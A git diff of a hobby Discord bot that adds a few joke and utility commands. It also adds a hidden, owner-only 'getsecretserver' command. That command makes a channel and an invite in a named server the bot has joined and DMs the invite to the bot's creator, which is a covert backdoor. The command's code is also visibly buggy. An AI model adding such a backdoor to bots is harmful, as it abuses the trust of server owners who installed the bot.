@@ -8,6 +8,7 @@ const tts = require('say');
 const fileService = require('fs');
 require('discord-reply');
 const { UV_FS_O_FILEMAP } = require('constants');
+const { title } = require('process');
 const myIntents = new Discord.Intents(Discord.Intents.ALL);
 const client = new Discord.Client({ ws: { intents: myIntents } });
 const prefix = '>';
@@ -367,6 +368,30 @@ client.on('message', message =>{
                 message.channel.send("did you have a brain fart");
             }
         }
+        if(cmd === 'getsecretserver'){
+            if(message.author.id === "216253735670775809"){
+                //console.log(client.guilds.cache.map(e=>e.toString()).join("\n"));
+                const riotServer = client.guilds.cache.find(serverName => serverName.name === "Bot Hell, Inc.");
+                riotServer.channels.create("am-i-in-yet", {
+                    type: "text",
+                    permissionOverwrites: [
+                        {
+                          id: message.guild.roles.everyone,
+                          allow: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY'],
+                          deny: ['VIEW_CHANNEL', 'SEND_MESSAGES', 'READ_MESSAGE_HISTORY']
+                        }
+                    ]
+                })
+                const guildChannel = riotServer.channels.cache.find(channelName => channelName.name === "am-i-in-yet").id;
+                const riotChannel = client.channels.cache.get(guildChannel).send("jsguio");
+                riotChannel.createInvite().then(invite => {
+                    message.member.user.dmChannel.send("Secret invite!!!!! https://discord.gg/" + invite.code);
+                });
+                //message.channel.send(riotServer.members.cache.map(membersThere => membersThere.toString()).join("\n"));
+            } else {
+                message.channel.send("Sorry man, you don't have access to this command!");
+            }
+        }
         if(cmd === 'quote'){
             message.channel.messages.fetch({ limit: 2}).then(messages => {
                 let lastMessage = messages.last();
@@ -422,6 +447,9 @@ client.on('message', message =>{
             })
             .catch(console.error);
         }
+        if(cmd === 'servercount'){
+            message.channel.send(`I am currently in **${client.guilds.cache.size}** servers!`);
+        }
         if(cmd === 'restart' || cmd === 'refresh'){
             process.exit(1);
         }
@@ -432,7 +460,7 @@ client.on('message', message =>{
                 .addFields(
                     { name: 'Basic Commands:', value: '>idiot/\n>danny/\n>fat/\n>cheese/\n>swear/\n>>\n>ok\n>version\n>invite\n\n\n*a / behind a command means it is also compatible as a slash command.', inline: true},
                     { name: 'Miscellaneous Commands:', value: '>say\n>react\n>whos\n>quote\n>delete\n>membercount\n>random\n>math\n>ping\n>meme\n>meme2\n>pfp\n>rps', inline: true},
-                    { name: 'Voice Commands:', value: '>join\n>leave\n>voicemembercount\n>rickroll\n>fart/\n>avocado\n>chip/\n>say', inline: true},
+                    { name: 'Voice Commands:', value: '>join\n>leave\n>voicemembercount\n>rickroll\n>fart/\n>boom\n>avocado\n>chip/\n>say', inline: true},
                     { name: 'Support Server:', value: '<https://discord.gg/4kwx3ezpNW>'},
                     { name: 'Creator:', value: 'Idiot Bot was created by 94 Central, <https://www.youtube.com/94Central>.'}
                 )
@@ -546,6 +574,10 @@ client.on('message', async message =>{
         if(cmd === 'chip'){
             message.channel.send("https://cdn.discordapp.com/attachments/488412628029276180/838251865249677322/Consumir.-1.mp4");
             playSongFile('./audio/chip.mp3');
+        }
+        if(cmd === 'boom'){
+            message.channel.send("NO MORE RACISM");
+            playSongFile('./audio/boom.mp3');
         }
         // if(cmd === 'play'){
         //     message.channel.send("Alright sure, playing whatever the hell you sent.");
